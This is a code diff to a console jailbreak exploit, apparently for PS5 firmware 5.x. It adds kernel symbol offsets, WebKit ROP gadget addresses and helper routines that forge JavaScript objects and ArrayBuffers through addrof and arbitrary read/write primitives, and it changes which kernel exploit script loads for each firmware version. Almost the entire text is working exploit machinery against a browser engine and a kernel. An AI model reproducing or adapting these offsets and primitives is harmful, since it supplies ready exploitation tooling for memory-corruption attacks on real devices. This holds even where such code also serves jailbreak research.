@@ -23,7 +23,7 @@ function get_syscall(id) {
 }
 
 async function exploit() {
-  if (version.major < 6) {
+  if (version.major < 5) {
     await load_script('src/lapse.js');
   } else {
     await load_script('src/ps5/relapse.js');
@@ -151,6 +151,213 @@ async function post_jailbreak() {
 }
 
 const impl_map = {
+	5: {
+    0: {
+      k_sysctl___kern_smp_cpus: 0x273c6e0,
+      k_route_output_rtmsg2_ret: 0xa7884f,
+      k_ntpadj_lock: 0x1a3efb8,
+      k_dynlib_status: 0x118,
+      k_allproc: 0x355dd00,
+      k_aio_table: 0xc00,
+
+      lk_close: 0x35750,
+      lk__error: 0x1d830,
+      lc_strerror: 0x794a0,
+
+      wk_pthread_create: 0x21c0220,
+      wk_pthread_join: 0x21c0260,
+      wk_expm1_builtin: 0x15948,
+      wk___imp___error: 0x28d8da0,
+      wk___imp_strerror: 0x28d8dc8,
+
+      wk_TypedArray_m_mode: 0x1c,
+      wk_JSFunction_m_function: 0x28,
+      wk_ArrayBuffer_m_contents_m_data: 0x10,
+      wk_ArrayBuffer_m_contents_m_sizeInBytes: 0x24,
+      wk_JSGlobalObject_m_vm_topEntryFrame: 0x9ee0,
+
+      get wk_RET() {
+        return webkit_base.add(0xc7);
+      },
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x21335e3);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1d2f5c3);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x149ca0c);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x189e761);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0x12a11c9);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x189e771);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x21ba7e9);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x1ee5506);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0x1d5c288);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0x21ba473);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x20649b3);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x21bd082);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x1ee5507);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x21ba7ea);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x9d099a);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x1e5ed70);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1f4b74c);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x19db746);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0xb51f0d);
+      },
+      make_fake_container(jscell) {
+        const container = {
+          jscell: jscell, // NaN-boxed, fix later
+          butterfly: null, // becomes 0x2, fix later
+          vector: arw.victim,
+          length_and_mode: true, // becomes 0x7
+        };
+
+        delete container.butterfly; // becomes 0
+
+        return container;
+      },
+      make_master(victim_addr) {
+        arw.victim.setBInt(0x10, victim_addr, true);
+        arw.victim.setUint32(impl.wk_TypedArray_m_mode, 1, true); // TypedArrayMode:OversizeTypedArray
+      },
+      fix_victim() {
+        const victim_addr = arw.addrof(arw.victim);
+        logger.debug(`victim_addr: ${victim_addr}`);
+
+        arw.view(victim_addr).setInt32(0x18, -1, true);
+      },
+      ab_fake(ab, addr, len) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+        const m_data = arw.view(m_impl).getBInt(0x10, true);
+
+        ab.m_data = m_data;
+
+        arw.view(m_impl).setBInt(0, 2, true); // DeferrableRefCountedBase::m_refCount
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, addr, true);
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, len, true);
+      },
+      ab_free(ab) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+
+        arw.view(m_impl).setBInt(0, 0, true); // DeferrableRefCountedBase::m_refCount
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_data, ab.m_data, true);
+        arw.view(m_impl).setBInt(impl.wk_ArrayBuffer_m_contents_m_sizeInBytes, 0, true);
+      },
+      ab_data(ab) {
+        const ab_addr = arw.addrof(ab);
+        const m_impl = arw.view(ab_addr).getBInt(0x10, true);
+
+        return arw.view(m_impl).getBInt(impl.wk_ArrayBuffer_m_contents_m_data, true);
+      },
+    },
+    2: {
+      lk_close: 0x35680,
+
+      wk_pthread_create: 0x21bf050,
+      wk_pthread_join: 0x21bf090,
+      wk___imp___error: 0x28d4da0,
+      wk___imp_strerror: 0x28d4dc8,
+
+      get wk_LEAVE_RET() {
+        return webkit_base.add(0x8ff1e3);
+      },
+      get wk_POP_R8_RET() {
+        return webkit_base.add(0x1d2e3f3);
+      },
+      get wk_POP_R9_RET() {
+        return webkit_base.add(0x149b4cc);
+      },
+      get wk_POP_R11_RET() {
+        return webkit_base.add(0x189d591);
+      },
+      get wk_POP_R12_RET() {
+        return webkit_base.add(0x129f699);
+      },
+      get wk_POP_R13_RET() {
+        return webkit_base.add(0x189d5a1);
+      },
+      get wk_POP_R14_RET() {
+        return webkit_base.add(0x21b9609);
+      },
+      get wk_POP_R15_RET() {
+        return webkit_base.add(0x1ee4336);
+      },
+      get wk_POP_RAX_RET() {
+        return webkit_base.add(0x1e7155c);
+      },
+      get wk_POP_RBX_RET() {
+        return webkit_base.add(0x57793d);
+      },
+      get wk_POP_RCX_RET() {
+        return webkit_base.add(0x2119fd3);
+      },
+      get wk_POP_RDX_RET() {
+        return webkit_base.add(0x193df77);
+      },
+      get wk_POP_RDI_RET() {
+        return webkit_base.add(0x1ee4337);
+      },
+      get wk_POP_RSI_RET() {
+        return webkit_base.add(0x3365fe);
+      },
+      get wk_POP_RBP_RET() {
+        return webkit_base.add(0x193744d);
+      },
+      get wk_POP_RSP_RET() {
+        return webkit_base.add(0x0585416);
+      },
+      get wk_MOV_QWORD_PTR_RDI_RAX_RET() {
+        return webkit_base.add(0x1f4a57c);
+      },
+      get wk_MOV_RAX_QWORD_PTR_RDI_RET() {
+        return webkit_base.add(0x19da576);
+      },
+      get wk_PUSH_QWORD_PTR_RBX_JMP_QWORD_PTR_RAX() {
+        return webkit_base.add(0xb511ed);
+      },
+    },
+    0x10: {
+      k_route_output_rtmsg2_ret: 0xa78a9f,
+    },
+    0x50: {
+      k_sysctl___kern_smp_cpus: 0x273c820,
+      k_route_output_rtmsg2_ret: 0xa7988f,
+    },
+  },
   6: {
     0: {
       k_sysctl___kern_smp_cpus: 0x277e4c0,
